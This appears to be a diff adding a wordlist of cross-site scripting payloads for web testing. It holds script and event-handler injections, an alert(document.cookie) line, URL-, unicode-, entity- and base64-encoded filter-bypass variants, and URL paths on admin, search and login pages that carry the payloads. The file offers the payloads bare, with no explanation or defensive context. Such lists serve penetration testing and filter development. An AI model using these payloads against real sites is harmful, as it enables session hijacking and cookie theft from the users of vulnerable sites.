@@ -1,0 +1,32 @@
+%3E%3Cscript%3E
+<source onclick="alert(1)"></source>
+a=alert,a(1)
+onload=alert(1)><svg/1=
+alert(document.cookie)
+eval(a);
+alert(1)
+<TABLE BACKGROUND="javascript:alert('XSS')"></TABLE>
+<BODY ONLOAD=alert('XSS')>
+<IMGSRC="javascript:alert('XSS')">
+
+
+%u003cscript%u003ealert(1);%u003c/script%u003e
+%u0022%u003e
+PHNjcmlwdD54PW5ldyBYTUxIdHRwUmVxdWVzdCgpO3
+gub3BlbigiR0VUIiwiaHR0cDovL3hzc21lLmh0bWw1c2VjLm9
+yZy94c3NtZTIvIix0cnVlKTt4Lm9ubG9hZD1mdW5j
+jAvAsCrIpT&colon;ale&lpar
+j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab
+IMG 6;&#97;&#118;&#97;&#115;&#99;&#114
+
+
+boafrm/=%3E%3Cscript%3E
+1 admin/mediaAdmin.php?id=%22%3E%3Ciframe%20src=a%20onload=alert%28%22VL%22%29%20%3C
+1 search.php?test=query$=document,$=$.URL,$$=unescape,$$$=eval,$$$($$($))%0
+1 index.html?test=query%3CSTYLE%20TYPE=%22text/javascript%22%3Ealert('XSS');%3C/STYLE%3E%0
+1 search.php?test=queryA=alert;A(1)%0
+1 index.php#<BODY BACKGROUND="javascript:alert('XSS')">
+1 login.html?a="get";
+1 forma.html?b=query%3CBODY%20onload
+1 search.php?test=queryExecute(MsgBox(chr(88)&chr(83)&chr(83)))
+
